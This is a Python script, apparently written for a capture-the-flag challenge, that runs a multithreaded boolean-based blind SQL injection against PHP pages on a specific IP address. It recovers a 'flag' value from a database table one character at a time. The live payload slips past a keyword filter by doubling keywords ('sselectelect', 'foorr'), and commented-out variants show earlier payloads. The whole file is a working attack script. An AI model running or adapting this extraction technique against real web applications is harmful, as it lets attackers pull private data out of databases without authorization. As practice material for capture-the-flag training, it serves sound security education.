import concurrent.futures
from datetime import datetime

import requests

st = datetime.now().timestamp()
sets = []
for i in range(ord('a'), ord('z') + 1):
    sets.append(chr(i))
# for i in range(ord('A'), ord('Z') + 1):
#     sets.append(chr(i))
for i in range(ord('0'), ord('9') + 1):
    sets.append(chr(i))
sets.append('{')
sets.append('}')
res = {}
items = [i for i in range(1, 39)]


def process_item(i):
    # 这里是你的处理函数
    for j in sets:
        # base_url = "http://121.40.71.160:32785/BoolBasedSQLi.php?id=1' and substr((select flag from flag)," + str(
        #     i) + ",1)='" + j
        # base_url = "http://121.40.71.160:32788/Sqli2.php?id=1%27%26%26%20substr((select%20flag%20from%20flag)%20from%20" + str(
        #     i) + "%20for%201)=%27" + j
        # print(base_url)
        base_url = "http://121.40.71.160:32788/Sqli3.php?id=1%27%20%26%26%20substr((sselectelect%20flag%20from%20flag)%20from%20" + str(
            i) + "%20foorr%201)=%27" + j
        response = requests.get(base_url)
        # if ('not' not in response.text):
        #     return j
        if ('No' not in response.text):
            return j


with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
    futures = [executor.submit(process_item, item) for item in items]
    done, not_done = concurrent.futures.wait(futures)
    for future in done:
        item = futures.index(future)  # 获取原始提交顺序
        try:
            result = future.result()
            # print(str(item) + " " + result)
            res[item] = result
        except Exception as exc:
            print(f'{items[item]} generated an exception: {exc}')
        # else:
        #     print(f'{items[item]} processed successfully +{item}+:+{result}')
ss = ''
for i in sorted(res):
    if (res[i] is not None):
        ss += res[i]
et = datetime.now().timestamp()
print(ss + " 本次用时:" + str((et - st)) + "秒")
